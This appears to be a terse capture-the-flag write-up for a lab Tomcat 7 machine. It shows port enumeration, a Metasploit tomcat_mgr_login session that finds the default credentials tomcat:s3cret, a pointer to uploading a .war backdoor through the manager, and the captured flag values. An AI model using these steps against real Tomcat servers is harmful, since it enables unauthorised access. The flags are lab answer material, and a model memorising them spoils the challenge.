### [ENUMERATION]
    8080/tcp open  http    syn-ack Apache Tomcat/Coyote JSP engine 1.1
    |_http-favicon: Apache Tomcat
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-server-header: Apache-Coyote/1.1
    |_http-title: Apache Tomcat/7.0.88

    #http://10.10.10.95:8080/

### [EXPLOIT]
    msf6 auxiliary(scanner/http/tomcat_mgr_login) > set user_as_pass true
    user_as_pass => true
    msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhost 10.10.10.95
    rhost => 10.10.10.95
    msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rport 8080
    rport => 8080
    msf6 auxiliary(scanner/http/tomcat_mgr_login) > set blank_passwords  true
    blank_passwords => true
    msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

    [+]10.10.10.95:8080 - Login Successful: tomcat:s3cret

    [+] 10.10.10.95:8080 - Login Successful: tomcat:s3cret

### [EXPLOIT]
    use exploit/multi/http/tomcat_mgr_upload

    user the user/password and set targeruri to /manager
    Alternative can login to the manager and manually upload a .war backdoor

### [FLAGS]
    C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt
    7004dbcef0f854e0fb401875f26ebd00
    #root
    04a8b36e1545a455393d067e772fe90e
